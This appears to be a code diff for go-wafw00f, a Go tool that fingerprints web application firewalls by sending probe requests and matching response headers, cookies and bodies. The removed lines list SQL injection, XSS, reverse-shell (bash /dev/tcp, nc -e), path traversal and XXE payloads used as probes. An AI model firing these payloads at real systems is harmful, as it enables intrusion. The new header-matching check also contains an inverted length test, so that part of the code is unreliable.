@@ -4,100 +4,114 @@ import (
 	"regexp"
 	"strings"
 
-	"github.com/ShangRui-hash/go-wafw00f/http"
+	"github.com/ShangRui-hash/go-wafw00f/model"
+	"github.com/ShangRui-hash/go-wafw00f/retryhttp"
+
+	"github.com/sirupsen/logrus"
 )
 
-var httpClient http.Client
-
-func init() {
-	httpClient = http.Client{}
-}
-
-func DetectWaf(url string) []string {
-	var results []string
-
-	sqlPayloads := []string{
-		"?id=1'%20union%20select%1%20from%20information_schema.tables%20--+",
-		"?id=1/**/and/**/1=(updatexml(1,concat(0x3a,(database())),1))%23",
-		"?id=1%20and/**/if((select%20count(schema_name)+" +
-			"from/**/information_schema.schemata)=9,sleep(5),1)--+",
-	}
-	xssPayloads := []string{
-		"?id=1<script>alert('test');</script>",
-		"?id=1<scRiPt src='http://xxx/xss.js'></scRiPt>",
-		"?id=1<iframe onload=alert('xss')>",
-	}
-	rcePayloads := []string{
-		"?cmd=/bin/cat+/etc/passwd",
-		"?cmd=bash+-i+>&+/dev/tcp/1.1.1.1/111+0>&1",
-		"?cmd=nc+-v+1.1.1.1+1111+-e+/bin/bash",
-	}
-	includePayload := "?file=../../../../etc/passwd"
-	xxePayload := "?id=<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn>"
+func DetectWaf(url string, payloads []string) (results []string, err error) {
 	if !strings.HasSuffix(url, "/") {
 		url = url + "/"
 	}
 	urlRe := regexp.MustCompile(`http.*?\..*?/`)
 	match := urlRe.FindAllStringSubmatch(url, -1)
-
 	rootUrl := strings.TrimRight(match[0][0], "/")
-	var payloads []string
-	payloads = append(append(append(append(payloads, sqlPayloads...),
-		xssPayloads...), rcePayloads...), includePayload, xxePayload)
-
 	for _, v := range payloads {
-		_, headers, body := httpClient.DoGet(rootUrl+v, nil, nil)
-		success, result := detect(headers, body)
-		if success == true {
+		url := rootUrl + v
+		resp, err := retryhttp.Get(url)
+		if err != nil {
+			logrus.Error("retryhttp.Get failed,err:", err)
+			return nil, err
+		}
+		logrus.Debugf("requestURL:%s,statusCode:%d\nresp headers:%s\nresp_body:%s\n", rootUrl+v, resp.StatusCode, resp.Headers, resp.Body)
+		success, result := detect(resp.Headers, resp.Body)
+		if success {
 			results = append(results, result)
 		}
 	}
-
 	results = removeRepeatedElement(results)
-	return results
+	return results, nil
 }
 
-func detect(headers map[string]string, body []byte) (bool, string) {
-	for _, item := range Waf.Items {
-		flag := 0
-		if item.ReHeaders != nil && len(item.ReHeaders) != 0 {
-			for _, v := range item.ReHeaders {
-				key := v.Key
-				reValue := v.ReValue
-				for innerK, innerV := range headers {
-					if strings.ToLower(innerK) == strings.ToLower(key) {
-						re := regexp.MustCompile(reValue)
-						if re.MatchString(innerV) == true {
-							flag++
-						}
-					}
-				}
-			}
-		}
-		if item.ReCookies != nil && len(item.ReCookies) != 0 {
-			for _, v := range item.ReCookies {
-				for innerK, innerV := range headers {
-					if strings.ToLower(innerK) == "cookie" {
-						re := regexp.MustCompile(v)
-						if re.MatchString(innerV) == true {
-							flag++
-						}
-					}
-				}
-			}
-		}
-		if item.ReContent != nil && len(item.ReContent) != 0 {
-			for _, v := range item.ReContent {
-				re := regexp.MustCompile(v)
-				if re.MatchString(string(body)) == true {
+//matchHeaders 匹配响应头
+func matchHeader(ruleItem model.WafItems, headers map[string]string) bool {
+	//对header 没有要求
+	if ruleItem.ReHeaders == nil || len(ruleItem.ReHeaders) != 0 {
+		return ruleItem.Condition == "all"
+	}
+	flag := 0
+	for key, reValue := range ruleItem.ReHeaders {
+		for innerK, innerV := range headers {
+			if strings.EqualFold(innerK, key) {
+				if regexp.MustCompile(reValue).MatchString(innerV) {
+					logrus.Debugf("condition:%srule:%s,match content:%s\n", ruleItem.Condition, reValue, innerV)
 					flag++
 				}
-
 			}
 		}
-		totalRule := len(item.ReContent) + len(item.ReCookies) + len(item.ReHeaders)
-		if flag == totalRule && totalRule != 0 {
-			return true, item.Name
+	}
+	totalRule := len(ruleItem.ReHeaders)
+	if flag == totalRule && totalRule != 0 {
+		return true
+	}
+	return false
+}
+
+//matchCookie 匹配cookie
+func matchCookie(ruleItem model.WafItems, headers map[string]string) bool {
+	//对cookie 没有要求
+	if ruleItem.ReCookies == nil || len(ruleItem.ReCookies) == 0 {
+		return ruleItem.Condition == "all"
+	}
+	flag := 0
+	value, ok := headers["Cookie"]
+	if ok {
+		for _, rule := range ruleItem.ReCookies {
+			if regexp.MustCompile(rule).MatchString(value) {
+				logrus.Debugf("rule:%s,match content:%s\n", rule, value)
+				flag++
+			}
+		}
+	}
+	totalRule := len(ruleItem.ReCookies)
+	if flag == totalRule && totalRule != 0 {
+		return true
+	}
+	return false
+}
+
+func matchContent(ruleItem model.WafItems, content string) bool {
+	//对content 没有要求
+	if ruleItem.ReContent == nil || len(ruleItem.ReContent) == 0 {
+		return ruleItem.Condition == "all"
+	}
+	for _, v := range ruleItem.ReContent {
+		if regexp.MustCompile(v).MatchString(content) {
+			logrus.Debugf("rule:%s,match content:%s\n", v, content)
+			return true
+		}
+	}
+	return false
+}
+
+//detect 对响应报文的headers 和body进行匹配
+func detect(headers map[string]string, body string) (bool, string) {
+	for _, item := range Waf.Items {
+		//1.正则匹配响应头
+		isMatchHeader := matchHeader(item, headers)
+		//2.正则匹配cookie
+		isMatchCookie := matchCookie(item, headers)
+		//3.正则匹配body
+		isMatchContent := matchContent(item, body)
+		if item.Condition == "all" {
+			if isMatchHeader && isMatchCookie && isMatchContent {
+				return true, item.Name
+			}
+		} else if item.Condition == "any" {
+			if isMatchHeader || isMatchCookie || isMatchContent {
+				return true, item.Name
+			}
 		}
 	}
 	return false, "Not Detected"
